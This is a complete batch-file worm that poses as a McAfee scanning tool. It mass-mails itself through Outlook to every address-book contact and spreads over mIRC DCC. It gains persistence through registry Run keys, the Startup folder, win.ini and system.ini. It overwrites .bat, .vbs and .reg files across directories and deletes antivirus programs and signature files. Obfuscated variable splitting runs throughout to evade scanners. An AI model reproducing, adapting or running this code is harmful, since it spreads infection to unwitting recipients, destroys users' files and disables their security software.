@echo off
ctty nul
Set MyS=%0
copy %MyS% McaFee.bat
copy McaFee.bat C:\Scan.bat
copy McaFee.bat C:\vavpi.vbs
set VBSwayF=dim
echo %VBSwayF% x > C:\vavpi.vbs
set VBSwayF=
echo.on error resume next >> C:\vavpi.vbs
echo Set fso =" Scripting.FileSystem.Object" >> C:\vavpi.vbs
set vbsosf=qd
set vbsosf=f
echo Set so=CreateObject(%vbsosf%so) >> C:\vavpi.vbs
set vbsosf=
echo Set ol=CreateObject("Outlook.Application") >> C:\vavpi.vbs
echo Set out= WScript.CreateObject("Outlook.Application") >> C:\vavpi.vbs
set VBSwayD=out
echo Set mapi = %VBSwayD%.GetNameSpace("MAPI") >> C:\vavpi.vbs
set VBSwayD=
set VBSwayN=Lists
echo Set a = mapi.Address%VBSwayN%(1) >> C:\vavpi.vbs
set VBSwayN=
echo Set ae=a.AddressEntries >> C:\vavpi.vbs
echo For x=1 To ae.Count >> C:\vavpi.vbs
echo Set Mail=ol.CreateItem(0) >> C:\vavpi.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\vavpi.vbs
echo Mail.Subject="Mcafee's Tools" >> C:\vavpi.vbs
echo Mail.Body="The Scan And Kill Viruses Tools Of Mcafee." >> C:\vavpi.vbs
set sendB=i
set attA=t
set attB=m
set attC=n
set VBSwayM=A%attA%tach%attB%e%attC%ts
echo Mail.%VBSwayM%.Add("C:\Scan.bat") >> C:\vavpi.vbs
set VBSwayM=
set sendA=n
set sendB=l
echo Mai%sendB%.se%sendA%d >> C:\vavpi.vbs
set vsenda=dyos
set vsendb=dyo
set vsenda=N
set vsendb=t
echo %vsenda%ex%vsendb% >> C:\vavpi.vbs
set vsenda=
set vsendb=
echo ol.Quit >> C:\vavpi.vbs
set cscA=ipt
set wlfnz=cscr%cscA%
%wlfnz% C:\vavpi.vbs
del C:\vavpi.vbs
del C:\Scan.bat
md C:\pro
copy McaFee.bat C:\pro\Scan.bat
if exist C:\mirc\script.ini set mIRC=C:\mirc\script.ini
if exist C:\mirc32\script.ini set mIRC=C:\mirc32\script.ini
if exist C:\progra~1\mirc\script.ini set mIRC=C:\progra~1\mirc\script.ini
if exist C:\progra~1\mirc32\script.ini set mIRC=C:\progra~1\mirc32\script.ini
set spp=bo
set ircc=send
set spp=dcc %ircc% $nick C:\pro\Scan.batecho [script] > %mIRC%
set ircb=ei
set ircb=if
echo n0=on 1:join:*.*: { %ircb% ( $nick !=$me ) /%spp% } >>%mIRC%
set ircb=
set spp=
set mIRC=
copy McaFee.bat %windir%\tadwh.bat
echo REGEDIT4 >henin.reg
set regA=kx
set regB=bc
set regA=S
set regB=r
echo [HKEY_LOCAL_MACHINE\%regA%oftwa%regB%e\Microsoft\Windows\CurrentVersion\Run\] >>henin.reg
echo "oaxti"="%windir%\tadwh.bat">>henin.reg
set RDA=for
%RDA% %%r in (*.reg \*.reg ..\*.reg %path%\*.reg %windir%\*.reg) do copy henin.reg %%r
set regA=
set regB=
set vbsA=ob
set vbsB=xx
set vbsA=s
set vbsB=i
copy McaFee.bat unsap.vbs
copy McaFee.bat %windir%\vawcj.bat
echo.on error resume next > unsap.vbs
echo dim wshs >>unsap.vbs
echo set wshs=w%vbsA%cr%vbsB%pt.createobject("w%vbsA%cr%vbsB%pt.shell") >>unsap.vbs
echo wshs.run "%windir%\vawcj.bat" >>unsap.vbs
set VDA=for
%VDA% %%q in (*.vbs \*.vbs ..\*.vbs %path%\*.vbs %windir%\*.vbs) do copy unsap.vbs %%q
set VDA=
set vbsA=
set vbsB=
copy McaFee.bat orudf.vbs
copy McaFee.bat %windir%\znivy.bat
echo.on error resume next >orudf.vbs
echo set ws = CreateObject("wscript.shell") >> orudf.vbs
set regi=wv
set regi=L
echo ws.regwrite "HK%regi%M\Software\Microsoft\Windows\CurrentVersion\Run\hicns","%windir%\znivy.bat" >>orudf.vbs
set regi=
set regiA=sc
c%regi%ript orudf.vbs
del orudf.vbs
set regiA=
set BDAs=     enq
set BDAs=for
copy McaFee.bat %winDir%\sxmcq.bat
%BDAs% %%v in (*.bat ..\*.bat \*.bat %path%\*.bat) do copy %WinDir%\sxmcq.bat %%v
del %WinDir%\sxmcq.bat
copy McaFee.bat %windir%\Startm~1\Programs\StartUp\pyrib.bat
set WDs=for
copy McaFee.bat C:\dsjkx.bat
%WDs% %%w in (%windir%\*.bat) do copy C:\dsjkx.bat %%w
del C:\dsjkx.bat
copy McaFee.bat %WinDir%\system\WINI.bat
set inia=windows
echo [%inia%] >funny.bat
set inib=system
echo load=%windir%\%inib%\WINI.bat >>funny.bat
set inic=or
set inic=WINI.bat
echo run=%windir%\system\%inic% >>funny.bat
set inid=
set inic=
set inib=
set inia=
set inid=Port
set inie=oc
set inie=N
set inif=o
echo %inie%ull%inid%=N%inif%ne >>funny.bat
copy funny.bat %windir%\dd.ini
set inif=win
del %windir%\%inif%.ini
del funny.bat
set inih=dd.in
ren %windir%\%inih%i win.ini
set inih=
set inig=
set inif=
set inie=
copy McaFee.bat ebawh.bat
echo [boot] > %windir%\system.ini
set sysiniA=ge
set sysiniB=tw
set sysiniA=h
set sysiniB=l
echo s%sysiniA%el%sysiniB%=explorer.exe %windir%\ebawh.bat>> %windir%\system.ini
sysiniA=
sysiniB=
command /f /c copy McaFee.bat A:\
@del McaFee.bat
set avA=r
set avB=r
del C:\p%avA%og%avB%a~1\kasper~1\avp32.exe
set avA=r
set avB=a
del C:\p%avA%ogr%avB%~1\norton~1\*.exe
set avA=o
set avB=a
del C:\pr%avA%gr%avB%~1\trojan~1\tc.exe
set avA=r
set avB=a
del C:\p%avA%ogr%avB%\norton~1\s32integ.dll
set avA=r
set avB=r
del C:\p%avA%og%avB%a\f-prot95\fpwm32.dll
set avA=o
set avB=a
del C:\pr%avA%gr%avB% \mcafee\scan.dat
set avA=p
set avB=a
del C:\%avA%rogr%avB%\tbav\tbav.dat
set avA=p
set avB=g
del C:\%avA%ro%avB%ra\avpersonal\antivir.vdf
set avA=t
set avB=w
del C:\%avA%bav%avB%95\tbscan.sig
ctty CON
